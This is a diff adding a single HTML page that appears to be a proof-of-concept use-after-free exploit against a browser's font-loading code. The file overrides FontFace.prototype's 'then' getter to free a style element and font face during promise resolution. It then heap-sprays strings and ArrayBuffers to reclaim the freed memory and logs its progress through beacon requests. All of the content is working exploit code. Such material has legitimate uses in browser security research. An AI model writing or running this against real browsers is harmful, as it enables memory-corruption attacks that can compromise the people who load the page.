@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>alias</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+</script>
+<script>
+(function(){
+  function run(){
+    b('AL-START');
+    var A = new FontFace('a','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A); void A.loaded;
+    var st = document.createElement('style');
+    st.id='victim-style';
+    st.textContent="@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+    document.head.appendChild(st);
+    var fired=false, strings=[], bufs=[], views=[];
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if (fired) return undefined;
+        fired=true;
+        b('AL-GET');
+        var v=document.getElementById('victim-style'); if(v) v.remove();
+        try{ document.fonts.delete(this); }catch(e){}
+        document.body.offsetHeight;
+        b('AL-FREED');
+        for (var i=0;i<400;i++){
+          var arr=new Array(128).fill("\u4141"); strings.push(arr.join(""));
+          var ab=new ArrayBuffer(274); bufs.push(ab); views.push(new Uint8Array(ab));
+          var arr2=new Array(128).fill("\u4141"); strings.push(arr2.join(""));
+        }
+        b('AL-SPRAY-' + strings.length + '-' + bufs.length);
+        for (var j=0;j<views.length;j++){ var w=views[j]; for (var k=0;k<w.length;k++) w[k]=0xAA; }
+        b('AL-FILLED');
+        var hit=-1, frag=-1;
+        for (var s=0;s<strings.length;s++){
+          if (strings[s].charCodeAt(0) === 0xAAAA) { hit=s; break; }
+        }
+        for (var t=0;t<bufs.length && hit<0;t++){ if (views[t][0]===0xAA) frag=t; }
+        b('AL-CHECK-hit' + hit + '-n' + strings.length);
+        b('AL-RET');
+        return undefined;
+      },
+      set:function(){}
+    });
+    b('AL-LOAD');
+    document.fonts.load('1em a, x','AB').then(
+      function(){ b('AL-RES'); },
+      function(){ b('AL-REJ'); }
+    );
+    setTimeout(function(){
+      var h=document.body.offsetHeight;
+      b('AL-POST-h' + h);
+    }, 300);
+  }
+  if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+  else document.addEventListener('DOMContentLoaded',run);
+})();
+</script>
+</head><body><p>alias</p></body></html>
